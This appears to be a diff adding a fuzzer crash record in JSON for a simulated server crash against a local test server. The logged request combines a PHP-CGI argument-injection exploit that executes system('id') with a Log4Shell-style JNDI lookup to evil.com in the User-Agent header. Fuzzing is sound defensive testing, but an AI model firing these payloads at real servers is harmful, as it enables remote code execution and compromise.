@@ -1,0 +1,22 @@
+{
+  "timestamp": "2025-12-29T14:42:24.039999",
+  "crash_type": "server_crash",
+  "payload": "POST /cgi-bin/php-cgi.exe?%ADd+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Referer': 'http://localhost', 'Content-Length': '22'}\nBody: <?php system('id'); ?>",
+  "payload_hash": "a50c086b269f115e",
+  "request_method": "POST",
+  "request_path": "/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Referer": "http://localhost",
+    "Content-Length": "22"
+  },
+  "request_body": "<?php system('id'); ?>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 807
+}
